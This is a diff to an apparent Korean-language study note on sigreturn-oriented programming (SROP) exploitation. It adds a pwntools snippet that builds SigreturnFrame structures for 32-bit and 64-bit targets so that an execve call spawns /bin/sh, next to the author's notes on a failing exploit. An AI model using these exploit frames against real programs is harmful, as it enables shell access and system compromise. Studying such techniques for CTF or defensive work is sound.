@@ -131,7 +131,24 @@ p.sendline(payload)
 p.interactive()
 ```
 
-아니 난 왜 대체 익스가 안되나 계속 생각해봤는데 아직도 모르겠다. 왜 계속 다른 레지스터들은 변조가 되는데 eip랑 ecx는 변조가 안될까...  결국 그냥 다시 코딩해서 해결했다. 왜 처음엔 안된걸까 
+아니 난 왜 대체 익스가 안되나 계속 생각해봤는데 아직도 모르겠다. 왜 계속 다른 레지스터들은 변조가 되는데 eip랑 ecx는 변조가 안될까...  결국 그냥 다시 코딩해서 해결했다. 왜 처음엔 안된걸까
+
+pwntool에서는 다음과 같이 편리하게 사용할 수 있다.
+```
+#32bit
+frame = SigreturnFrame(kernel='i386')
+frame.eax = 0xb
+frame.ebx = binsh
+frame.esp = syscall
+frame.eip = syscall
+ 
+#64bit
+frame = SigreturnFrame(arch="amd64")
+frame.rax = constants.SYS_execve
+frame.rdi = binsh
+frame.rsp = syscall
+frame.rip = syscall
+```
 
 ++++++
 드디어 왜 안된지 알아낸 것 같다. 
